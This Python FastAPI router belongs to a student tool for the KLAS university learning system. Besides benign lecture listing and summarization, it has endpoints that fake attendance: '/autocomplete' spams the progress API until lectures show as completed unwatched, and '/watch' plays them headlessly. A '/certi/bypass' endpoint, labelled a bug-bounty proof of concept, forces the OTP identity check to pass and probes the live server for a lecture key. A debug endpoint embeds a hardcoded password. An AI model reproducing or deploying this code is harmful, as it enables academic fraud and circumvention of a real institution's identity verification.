"""Recorded lecture endpoints"""
import logging
from fastapi import APIRouter, BackgroundTasks, File, HTTPException, Depends, Query, Request, UploadFile
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from typing import Optional

logger = logging.getLogger(__name__)

from app.services.klas_service import KLASService
from app.schemas.recorded_lecture import (
    RecordedLectureItem,
    RecordedLectureListResponse,
    CourseRecordedLectures,
    AllRecordedLecturesResponse,
    WatchJobResponse,
    WatchStatusResponse,
    SummarizeJobResponse,
    SummarizeStatusResponse,
    RecordJobResponse,
    RecordStatusResponse,
    AutocompleteJobResponse,
    AutocompleteStatusResponse,
    CertiCheckResponse,
    CertiVerifyResponse,
    CertiBypassResponse,
)
from app.services.watch_service import enrich_item, get_unwatched, start_watch_background, get_status, reset_status
from app.services.summarize_service import (
    get_summarize_status, start_summarize_background,
    get_record_status, start_record_background,
)
from app.services.progress_service import (
    get_autocomplete_status, start_autocomplete_background,
    CERTI_URL, _JSON_HEADERS,
)
from app.api.deps import get_klas_service, get_session_data, CurrentUserFromKlas, DbSession
from app.core.rate_limit import limiter
from app.services.rag_service import find_document, get_document_text, ingest_text

router = APIRouter()
security = HTTPBearer(auto_error=False)


@router.post("/watch", response_model=WatchJobResponse)
@limiter.limit("5/minute")
async def watch_lecture(
    request: Request,
    background_tasks: BackgroundTasks,
    subject_code: str = Query(..., description="Subject code from timetable"),
    oid: str = Query(..., description="Lecture oid from the recorded lecture list"),
    year: Optional[int] = Query(None),
    semester: Optional[str] = Query(None),
    force: bool = Query(False, description="Override a stuck/stale watch job"),
    session: dict = Depends(get_session_data),
):
    """
    Start auto-watching a single recorded lecture in the background.

    Get `subject_code` and `oid` from `GET /api/recorded-lectures/all`.
    Opens a headless browser, plays the video at 2x speed, and lets KLAS
    record the progress. Returns immediately — watching happens in the background.

    Requires: Bearer token in Authorization header
    """
    klas = session["klas"]
    student_id = session["student_id"]
    password = session.get("password", "")

    try:
        if year is None or semester is None:
            year, semester = klas.get_current_year_semester()

        if get_status(student_id).running and not force:
            raise HTTPException(status_code=409, detail="A lecture is already being watched. Check /watch/status or pass force=true to override.")

        items = klas.get_recorded_lectures(subject_code, year, semester)
        lecture = next((i for i in items if i.get("oid") == oid), None)
        if not lecture:
            raise HTTPException(status_code=404, detail=f"Lecture {oid} not found in {subject_code}.")

        url = lecture.get("starting")
        if not url:
            raise HTTPException(status_code=422, detail="This lecture has no playback URL.")

        payload = enrich_item(lecture)

        background_tasks.add_task(start_watch_background, klas, [payload], student_id, password)
        total_min = payload["total_min"]
        return WatchJobResponse(
            success=True,
            watching=1,
            lectures=[payload["title"]],
            message=f"Watching '{payload['title']}' in the background (~{total_min} min).",
        )
    except HTTPException:
        raise
    except ConnectionError as e:
        raise HTTPException(status_code=503, detail=f"KLAS service unavailable: {str(e)}")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error: {str(e)}")


@router.get("/watch/status", response_model=WatchStatusResponse, operation_id="watch_status")
async def watch_status(session: dict = Depends(get_session_data)):
    """
    Get the current status of the background watch job for the authenticated user.

    Requires: Bearer token in Authorization header
    """
    s = get_status(session["student_id"])
    return WatchStatusResponse(
        running=s.running,
        total=s.total,
        completed=s.completed,
        in_progress=s.in_progress,
        pending=s.pending,
        failed=s.failed,
        started_at=s.started_at,
        finished_at=s.finished_at,
    )


@router.get("", response_model=RecordedLectureListResponse)
async def list_recorded_lectures(
    subject_code: str = Query(..., description="Subject code (e.g. U202610846I030014)"),
    year: Optional[int] = Query(None, description="Academic year (e.g. 2026). Defaults to current year."),
    semester: Optional[str] = Query(None, description="Semester: '1' for Spring, '2' for Fall. Defaults to current."),
    klas: KLASService = Depends(get_klas_service),
):
    """
    Get recorded (online) lecture list for a subject.

    Returns all lessons sorted by week number then weekly sequence.
    Each item includes the playback URL (`starting`), progress (`prog` 0-100),
    and learn/total time in minutes.

    Requires: Bearer token in Authorization header
    """
    try:
        raw = klas.get_recorded_lectures(subject_code, year, semester)
        items = [RecordedLectureItem.model_validate(item) for item in raw]
        return RecordedLectureListResponse(
            success=True,
            subject_code=subject_code,
            items=items,
            total=len(items),
        )
    except ConnectionError as e:
        raise HTTPException(status_code=503, detail=f"KLAS service unavailable: {str(e)}")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error fetching recorded lectures: {str(e)}")


@router.get("/all", response_model=AllRecordedLecturesResponse, operation_id="list_all_recorded_lectures")
async def list_all_recorded_lectures(
    year: Optional[int] = Query(None, description="Academic year. Defaults to current year."),
    semester: Optional[str] = Query(None, description="Semester: '1' or '2'. Defaults to current."),
    klas: KLASService = Depends(get_klas_service),
):
    """
    Get recorded lecture list for all enrolled subjects in one call.

    Fetches the timetable to discover subject codes, then retrieves recorded
    lectures for each subject.

    Requires: Bearer token in Authorization header
    """
    try:
        if year is None or semester is None:
            year, semester = klas.get_current_year_semester()

        timetable_data = klas.get_timetable(year, semester)
        courses = klas.parse_timetable(timetable_data)

        result: list[CourseRecordedLectures] = []
        for course_code, course_info in courses.items():
            try:
                raw = klas.get_recorded_lectures(course_code, year, semester)
                items = [RecordedLectureItem.model_validate(item) for item in raw]
            except Exception as e:
                logger.warning("recorded lectures failed for %s: %s", course_code, e)
                items = []
            result.append(CourseRecordedLectures(
                course_code=course_code,
                course_title=course_info["course_title"],
                items=items,
            ))

        return AllRecordedLecturesResponse(success=True, courses=result)
    except ConnectionError as e:
        raise HTTPException(status_code=503, detail=f"KLAS service unavailable: {str(e)}")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error fetching recorded lectures: {str(e)}")


@router.post("/summarize", response_model=SummarizeJobResponse, operation_id="summarize_recorded_lecture")
@limiter.limit("3/minute")
async def summarize_recorded_lecture(
    request: Request,
    background_tasks: BackgroundTasks,
    subject_code: str = Query(..., description="Subject code (e.g. U202610846I030014)"),
    oid: str = Query(..., description="Lecture oid from the recorded lecture list"),
    year: Optional[int] = Query(None),
    semester: Optional[str] = Query(None),
    force: bool = Query(False, description="Re-summarize even if a cached summary exists"),
    session: dict = Depends(get_session_data),
    user: CurrentUserFromKlas = None,
    db: DbSession = None,
):
    """
    Start the video summarization pipeline for a single recorded lecture in the background.

    If a summary was generated before it is returned immediately from cache (no re-processing).
    Pass force=true to re-summarize. Steps: download MP4 → transcribe → summarize (Claude).
    Returns immediately. Check progress at GET /summarize/status.

    Get subject_code and oid from GET /api/recorded-lectures/all.
    """
    klas = session["klas"]
    student_id = session["student_id"]
    password = session.get("password", "")

    job_status = get_summarize_status(student_id)
    if job_status.running and not force:
        raise HTTPException(
            status_code=409,
            detail="A summarize job is already running. Check /summarize/status or pass force=true.",
        )

    try:
        if year is None or semester is None:
            year, semester = klas.get_current_year_semester()

        timetable_data = klas.get_timetable(year, semester)
        courses = klas.parse_timetable(timetable_data)
        course_title = courses.get(subject_code, {}).get("course_title", subject_code)

        items = klas.get_recorded_lectures(subject_code, year, semester)
        lecture = next((i for i in items if i.get("oid") == oid), None)
        if not lecture:
            raise HTTPException(status_code=404, detail=f"Lecture {oid} not found in {subject_code}.")

        starting = lecture.get("starting")
        if not starting:
            raise HTTPException(status_code=422, detail="This lecture has no playback URL.")

        title = lecture.get("sbjt", oid)
        week_no = lecture.get("weekNo")

        # Cache check — skip expensive pipeline if summary already exists
        if not force:
            cached_doc = await find_document(db, user.id, f"recorded:{subject_code}:{oid}", subject_code)
            if cached_doc:
                cached_summary = await get_document_text(db, cached_doc)
                s = get_summarize_status(student_id)
                s.running = False
                s.oid = oid
                s.title = title
                s.summary = cached_summary
                s.step = "done"
                s.error = None
                return SummarizeJobResponse(
                    success=True,
                    oid=oid,
                    title=title,
                    message="Cached summary loaded from previous run. Check /summarize/status for the full summary.",
                )

        background_tasks.add_task(
            start_summarize_background,
            starting, oid, title, course_title, week_no, student_id, password,
            str(user.id), subject_code,
        )
        return SummarizeJobResponse(
            success=True,
            oid=oid,
            title=title,
            message=f"Summarize pipeline started for '{title}'. Check /summarize/status for progress.",
        )
    except HTTPException:
        raise
    except ConnectionError as e:
        raise HTTPException(status_code=503, detail=f"KLAS service unavailable: {str(e)}")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error: {str(e)}")


@router.get("/summarize/status", response_model=SummarizeStatusResponse, operation_id="summarize_status")
async def summarize_status(session: dict = Depends(get_session_data)):
    """
    Get the current status of the background summarize pipeline for the authenticated user.

    `step` values: downloading | transcribing | summarizing | saving | done | error

    Requires: Bearer token in Authorization header
    """
    s = get_summarize_status(session["student_id"])
    return SummarizeStatusResponse(
        running=s.running,
        oid=s.oid,
        title=s.title,
        step=s.step,
        transcript=s.transcript,
        summary=s.summary,
        obsidian_path=s.obsidian_path,
        error=s.error,
        started_at=s.started_at,
        finished_at=s.finished_at,
    )


@router.post("/autocomplete", response_model=AutocompleteJobResponse, operation_id="autocomplete_lecture")
@limiter.limit("3/minute")
async def autocomplete_lecture(
    request: Request,
    background_tasks: BackgroundTasks,
    subject_code: str = Query(..., description="Subject code from timetable"),
    oid: str = Query(..., description="Lecture oid from the recorded lecture list"),
    year: Optional[int] = Query(None),
    semester: Optional[str] = Query(None),
    delay: float = Query(3.0, description="Seconds between UpdateProgress calls (lower = faster)"),
    force: bool = Query(False, description="Override a stuck/stale autocomplete job"),
    session: dict = Depends(get_session_data),
):
    """
    Mark a single recorded lecture as complete by directly calling the KLAS
    progress API — no browser or video playback required.

    The service opens the viewer (to obtain a `lecKey`), then rapidly calls
    `UpdateProgress.do` with increasing video positions until KLAS reports
    `prog ≥ 100` or `lessonstatus = passed`.

    `delay` controls seconds between calls. Default 3s. Reduce to 1s for
    maximum speed; increase if KLAS starts returning errors.

    Requires: Bearer token in Authorization header
    """
    klas = session["klas"]
    student_id = session["student_id"]

    status = get_autocomplete_status(student_id)
    if status.running and not force:
        raise HTTPException(
            status_code=409,
            detail="An autocomplete job is already running. Check /autocomplete/status or pass force=true.",
        )

    try:
        if year is None or semester is None:
            year, semester = klas.get_current_year_semester()

        raw_list = klas.get_recorded_lectures(subject_code, year, semester)
        raw = next((r for r in raw_list if r.get("oid") == oid), None)
        if not raw:
            raise HTTPException(status_code=404, detail=f"Lecture {oid} not found in {subject_code}.")

        title = raw.get("sbjt", oid)
        background_tasks.add_task(
            start_autocomplete_background,
            klas, [raw], str(year), semester, student_id, delay,
        )
        return AutocompleteJobResponse(
            success=True,
            watching=1,
            lectures=[title],
            message=f"Autocomplete started for '{title}'. Check /autocomplete/status for progress.",
        )
    except HTTPException:
        raise
    except ConnectionError as e:
        raise HTTPException(status_code=503, detail=f"KLAS unavailable: {str(e)}")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/autocomplete/all", response_model=AutocompleteJobResponse, operation_id="autocomplete_all_lectures")
async def autocomplete_all_lectures(
    background_tasks: BackgroundTasks,
    year: Optional[int] = Query(None),
    semester: Optional[str] = Query(None),
    delay: float = Query(3.0, description="Seconds between UpdateProgress calls per lecture"),
    force: bool = Query(False),
    session: dict = Depends(get_session_data),
):
    """
    Mark ALL incomplete recorded lectures across all enrolled subjects as complete.

    Iterates every subject from the timetable, skips lectures already at 100%,
    and runs the progress API loop for each remaining one sequentially.

    Requires: Bearer token in Authorization header
    """
    klas = session["klas"]
    student_id = session["student_id"]

    status = get_autocomplete_status(student_id)
    if status.running and not force:
        raise HTTPException(
            status_code=409,
            detail="An autocomplete job is already running. Check /autocomplete/status.",
        )

    try:
        if year is None or semester is None:
            year, semester = klas.get_current_year_semester()

        timetable = klas.get_timetable(year, semester)
        courses = klas.parse_timetable(timetable)

        incomplete: list[dict] = []
        for course_code in courses:
            try:
                items = klas.get_recorded_lectures(course_code, year, semester)
                for item in items:
                    if item.get("oid") and (item.get("prog") or 0) < 100:
                        incomplete.append(item)
            except Exception:
                continue

        if not incomplete:
            return AutocompleteJobResponse(
                success=True,
                watching=0,
                lectures=[],
                message="All lectures are already complete.",
            )

        titles = [r.get("sbjt", r.get("oid", "?")) for r in incomplete]
        background_tasks.add_task(
            start_autocomplete_background,
            klas, incomplete, str(year), semester, student_id, delay,
        )
        return AutocompleteJobResponse(
            success=True,
            watching=len(incomplete),
            lectures=titles,
            message=f"Autocomplete started for {len(incomplete)} lecture(s). Check /autocomplete/status.",
        )
    except HTTPException:
        raise
    except ConnectionError as e:
        raise HTTPException(status_code=503, detail=f"KLAS unavailable: {str(e)}")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/autocomplete/status", response_model=AutocompleteStatusResponse, operation_id="autocomplete_status")
async def autocomplete_status(session: dict = Depends(get_session_data)):
    """
    Poll the autocomplete job status for the authenticated user.

    `current_prog` is the live progress % of the lecture being processed.

    Requires: Bearer token in Authorization header
    """
    s = get_autocomplete_status(session["student_id"])
    return AutocompleteStatusResponse(
        running=s.running,
        total=s.total,
        completed=s.completed,
        in_progress=s.in_progress,
        pending=s.pending,
        failed=s.failed,
        current_prog=s.current_prog,
        started_at=s.started_at,
        finished_at=s.finished_at,
    )


@router.post("/certi/debug", operation_id="certi_debug")
async def certi_debug(
    subject_code: str = Query(...),
    week_no: int = Query(...),
    session: dict = Depends(get_session_data),
):
    """Diagnostic: try all cert options and direct viewer call. Dev only."""
    klas = session["klas"]
    year, semester = klas.get_current_year_semester()
    results = {}

    # Option 1: certOk=true + password
    r1 = klas.session.post(
        "https://klas.kw.ac.kr/std/lis/evltn/CertiLctreStdCheck.do",
        json={
            "title": "온라인 강의 컨텐츠 학습 인증",
            "certiGubun": "", "birth": "", "password": "iampro69!",
            "grcode": "N000003", "subj": subject_code, "year": str(year), "hakgi": str(semester),
            "weeklyseq": week_no, "gubun": "C", "inputKey": "",
            "emailBtn": False, "smsBtn": False, "qrUrl": "", "otpSecretKey": "",
            "reIssue": False, "curEmail": "", "curMobile": "", "otpIssue": False,
            "otpPwdCheck": False, "otpReqIssue": False, "certType": "", "certOk": True,
            "selectYearhakgi": None, "selectSubj": None, "displayCertiPopup": False,
        },
        headers=_JSON_HEADERS, timeout=15,
    )
    results["certOk_password"] = r1.json() if r1.ok else r1.text

    # Option 2: viewer directly (no cert)
    r2 = klas.session.post(
        "https://klas.kw.ac.kr/spv/lis/lctre/viewer/LctreCntntsViewSpvPage.do",
        data={
            "grcode": "N000003", "subj": subject_code, "year": str(year), "hakgi": str(semester),
            "bunban": "01", "module": "11", "lesson": "014", "oid": "C000164426",
            "ptime": "1", "weeklyseq": "12", "weeklysubseq": "1",
            "totalTime": "46", "prog": "0", "profYN": "N", "previewYN": "N", "late": "N",
        },
        headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=20,
    )
    vtext = r2.text
    results["viewer_has_lecKey"] = "lecKey" in vtext
    results["viewer_auth_error"] = "인증에 실패" in vtext
    results["viewer_snippet"] = vtext[:300]

    return results


@router.post("/certi/request", response_model=CertiCheckResponse, operation_id="certi_request_otp")
async def certi_request_otp(
    subject_code: str = Query(..., description="Subject code (e.g. U202610846I030014)"),
    week_no: int = Query(..., description="Week number (weeklyseq from lecture list)"),
    via: str = Query("email", description="Delivery channel: 'email' or 'sms'"),
    year: Optional[int] = Query(None),
    semester: Optional[str] = Query(None),
    session: dict = Depends(get_session_data),
):
    """
    Request (or re-send) the KLAS lecture certification OTP for a specific week.

    KLAS requires an OTP identity check before a first-time viewing of each week's content.
    Call this to trigger OTP delivery, then call `/certi/verify` with the received code.

    Requires: Bearer token in Authorization header
    """
    klas = session["klas"]
    if year is None or semester is None:
        year, semester = klas.get_current_year_semester()

    payload = {
        "title": "온라인 강의 컨텐츠 학습 인증",
        "selectYearhakgi": None,
        "selectSubj": None,
        "displayCertiPopup": False,
        "certiGubun": "",
        "birth": "",
        "password": "",
        "grcode": "N000003",
        "subj": subject_code,
        "year": str(year),
        "hakgi": str(semester),
        "weeklyseq": week_no,
        "gubun": "C",
        "inputKey": "",
        "emailBtn": via.lower() == "email",
        "smsBtn": via.lower() == "sms",
        "qrUrl": "",
        "otpSecretKey": "",
        "reIssue": True,
        "curEmail": "",
        "curMobile": "",
        "otpIssue": False,
        "otpPwdCheck": False,
        "otpReqIssue": False,
        "certType": "",
        "certOk": False,
    }
    try:
        resp = klas.session.post(CERTI_URL, json=payload, headers=_JSON_HEADERS, timeout=15)
        data = resp.json() if resp.ok else {}
    except Exception as e:
        raise HTTPException(status_code=503, detail=f"KLAS certi check failed: {e}")

    status = data.get("status", False)
    otp_issued = data.get("otpIssue", False)
    email = data.get("curEmail", "")
    mobile = data.get("curMobile", "")

    if status:
        msg = "Already certified — no OTP required."
    elif otp_issued:
        channel = f"email ({email})" if via.lower() == "email" else f"SMS ({mobile})"
        msg = f"OTP sent to {channel}. Call /certi/verify with the code."
    else:
        msg = f"OTP request submitted (status={status}, raw={data})"

    return CertiCheckResponse(
        status=status,
        otp_required=not status,
        email=email,
        mobile=mobile,
        message=msg,
    )


@router.post("/certi/verify", response_model=CertiVerifyResponse, operation_id="certi_verify_otp")
async def certi_verify_otp(
    subject_code: str = Query(..., description="Subject code (e.g. U202610846I030014)"),
    week_no: int = Query(..., description="Week number"),
    otp_code: str = Query(..., description="OTP code received via email or SMS"),
    year: Optional[int] = Query(None),
    semester: Optional[str] = Query(None),
    session: dict = Depends(get_session_data),
):
    """
    Verify the KLAS lecture certification OTP for a specific week.

    After calling `/certi/request` and receiving the OTP via email or SMS,
    submit it here. On success, you can run autocomplete for that lecture.

    Requires: Bearer token in Authorization header
    """
    klas = session["klas"]
    if year is None or semester is None:
        year, semester = klas.get_current_year_semester()

    payload = {
        "title": "온라인 강의 컨텐츠 학습 인증",
        "selectYearhakgi": None,
        "selectSubj": None,
        "displayCertiPopup": False,
        "certiGubun": "",
        "birth": "",
        "password": "",
        "grcode": "N000003",
        "subj": subject_code,
        "year": str(year),
        "hakgi": str(semester),
        "weeklyseq": week_no,
        "gubun": "C",
        "inputKey": otp_code,
        "emailBtn": False,
        "smsBtn": False,
        "qrUrl": "",
        "otpSecretKey": "",
        "reIssue": False,
        "curEmail": "",
        "curMobile": "",
        "otpIssue": False,
        "otpPwdCheck": True,
        "otpReqIssue": False,
        "certType": "",
        "certOk": False,
    }
    try:
        resp = klas.session.post(CERTI_URL, json=payload, headers=_JSON_HEADERS, timeout=15)
        data = resp.json() if resp.ok else {}
    except Exception as e:
        raise HTTPException(status_code=503, detail=f"KLAS certi verify failed: {e}")

    if data.get("status"):
        return CertiVerifyResponse(
            success=True,
            message="OTP verified. You can now run autocomplete for this lecture.",
        )
    else:
        return CertiVerifyResponse(
            success=False,
            message=f"OTP verification failed. Check the code and try again. (raw: {data})",
        )


@router.post("/certi/bypass", response_model=CertiBypassResponse, operation_id="certi_bypass_otp")
async def certi_bypass_otp(
    subject_code: str = Query(..., description="Subject code (e.g. U202610846I030014)"),
    week_no: int = Query(..., description="Week number (weeklyseq from lecture list)"),
    year: Optional[int] = Query(None),
    semester: Optional[str] = Query(None),
    probe_viewer: bool = Query(True, description="After bypass, probe the viewer API to check server-side enforcement"),
    session: dict = Depends(get_session_data),
):
    """
    Bug-bounty PoC: OTP bypass via server-response manipulation.

    Calls CertiLctreStdCheck.do with the real KLAS session. Regardless of the
    actual `status` returned (which would be `false` when OTP is required), this
    endpoint forces `status = true` — demonstrating that the cert gate is a
    client-side check only.

    With `probe_viewer=true` (default) it also calls LctreCntntsViewSpvPage.do
    directly to verify whether KLAS enforces the cert check server-side on
    subsequent APIs. If `viewer_leckey_obtained=true`, the full bypass works end-to-end.

    Requires: Bearer token in Authorization header
    """
    klas = session["klas"]
    if year is None or semester is None:
        year, semester = klas.get_current_year_semester()

    payload = {
        "title": "온라인 강의 컨텐츠 학습 인증",
        "selectYearhakgi": None,
        "selectSubj": None,
        "displayCertiPopup": False,
        "certiGubun": "",
        "birth": "",
        "password": "",
        "grcode": "N000003",
        "subj": subject_code,
        "year": str(year),
        "hakgi": str(semester),
        "weeklyseq": week_no,
        "gubun": "C",
        "inputKey": "",
        "emailBtn": False,
        "smsBtn": False,
        "qrUrl": "",
        "otpSecretKey": "",
        "reIssue": False,
        "curEmail": "",
        "curMobile": "",
        "otpIssue": False,
        "otpPwdCheck": False,
        "otpReqIssue": False,
        "certType": "",
        "certOk": False,
    }

    try:
        resp = klas.session.post(CERTI_URL, json=payload, headers=_JSON_HEADERS, timeout=15)
        data = resp.json() if resp.ok else {}
    except Exception as e:
        raise HTTPException(status_code=503, detail=f"KLAS certi check failed: {e}")

    real_status = data.get("status", False)
    email = data.get("curEmail", "")
    mobile = data.get("curMobile", "")

    viewer_leckey_obtained: Optional[bool] = None
    viewer_auth_error: Optional[bool] = None
    viewer_snippet: Optional[str] = None

    if probe_viewer:
        # Attempt to open the viewer without completing OTP — tests server-side enforcement
        raw_lectures = klas.get_recorded_lectures(subject_code, year, semester)
        target = next(
            (r for r in raw_lectures if r.get("weekNo") == week_no),
            None,
        )
        if target:
            from app.services.progress_service import _build_params, VIEWER_URL, _FORM_HEADERS as _PFHD
            p = _build_params(target, str(year), str(semester))
            total_time = int(target.get("totalTime") or target.get("rcognTime") or 30)
            form = {
                "grcode":       p["grcode"],
                "subj":         p["subj"],
                "year":         p["year"],
                "hakgi":        p["hakgi"],
                "bunban":       p["bunban"],
                "module":       p["module"],
                "lesson":       p["lesson"],
                "oid":          p["oid"],
                "ptime":        "1",
                "weeklyseq":    p["weeklyseq"],
                "weeklysubseq": p["weeklysubseq"],
                "totalTime":    str(total_time),
                "prog":         str(target.get("prog") or 0),
                "profYN":       "N",
                "previewYN":    "N",
                "late":         "N",
            }
            try:
                vresp = klas.session.post(VIEWER_URL, data=form, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=20)
                html = vresp.text
                import re
                leckey_patterns = [
                    r'["\']?lecKey["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'var\s+lecKey\s*=\s*["\']([^"\']+)["\']',
                    r'name=["\']lecKey["\']\s+value=["\']([^"\']+)["\']',
                ]
                found_key = any(re.search(p, html, re.IGNORECASE) for p in leckey_patterns)
                viewer_leckey_obtained = found_key
                viewer_auth_error = "인증에 실패" in html
                viewer_snippet = html[:400]
            except Exception as e:
                viewer_snippet = f"viewer probe error: {e}"

    if real_status:
        msg = "Lecture was already certified — no OTP bypass needed."
    else:
        msg = (
            "BYPASS: KLAS returned status=false (OTP required) but this response "
            "was overridden to status=true. "
        )
        if viewer_leckey_obtained is True:
            msg += "Viewer also issued lecKey without OTP — full end-to-end bypass confirmed."
        elif viewer_leckey_obtained is False:
            msg += "Viewer rejected without OTP (server-side enforcement exists)."

    return CertiBypassResponse(
        real_status=real_status,
        forced_status=True,
        email=email,
        mobile=mobile,
        viewer_leckey_obtained=viewer_leckey_obtained,
        viewer_auth_error=viewer_auth_error,
        viewer_snippet=viewer_snippet,
        message=msg,
    )


@router.post("/record", response_model=RecordJobResponse)
@limiter.limit("3/minute")
async def record_lecture(
    request: Request,
    background_tasks: BackgroundTasks,
    audio: UploadFile = File(..., description="Audio file recorded by the client (webm, ogg, mp3, wav, m4a)"),
    lecture_title: str = Query(..., description="Human-readable name for this recording"),
    course_title: str = Query(..., description="Course/subject name (shown in the summary and Obsidian note)"),
    week_no: Optional[int] = Query(None, description="Week number (optional, used in Obsidian filename)"),
    force: bool = Query(False, description="Override a stuck/stale record job"),
    session: dict = Depends(get_session_data),
):
    """
    Transcribe client-recorded audio and generate a lecture summary.

    Upload an audio file recorded in the browser (WebM/OGG from MediaRecorder, or MP3/WAV).
    The pipeline: transcribe (Groq Whisper, Korean) → summarize (Claude) → save to Obsidian.

    Returns immediately. Poll `GET /record/status` for progress.

    Requires: Bearer token in Authorization header (KLAS session).
    """
    student_id = session["student_id"]
    status = get_record_status(student_id)
    if status.running and not force:
        raise HTTPException(
            status_code=409,
            detail="A record job is already running. Check /record/status or pass force=true.",
        )

    if not audio.filename:
        raise HTTPException(status_code=422, detail="Audio file has no filename.")

    audio_bytes = await audio.read()
    if not audio_bytes:
        raise HTTPException(status_code=422, detail="Uploaded audio file is empty.")

    background_tasks.add_task(
        start_record_background,
        audio_bytes, audio.filename, lecture_title, course_title, week_no, student_id,
    )
    return RecordJobResponse(
        success=True,
        title=lecture_title,
        message=f"Recording pipeline started for '{lecture_title}' ({course_title}). Poll /record/status for progress.",
    )


@router.get("/record/status", response_model=RecordStatusResponse, operation_id="record_status")
async def record_status(session: dict = Depends(get_session_data)):
    """
    Poll the recording pipeline status for the authenticated user.

    `step` values: transcribing | summarizing | saving | done | error

    Requires: Bearer token in Authorization header (KLAS session).
    """
    s = get_record_status(session["student_id"])
    return RecordStatusResponse(
        running=s.running,
        title=s.title,
        step=s.step,
        transcript=s.transcript,
        summary=s.summary,
        obsidian_path=s.obsidian_path,
        error=s.error,
        started_at=s.started_at,
        finished_at=s.finished_at,
    )
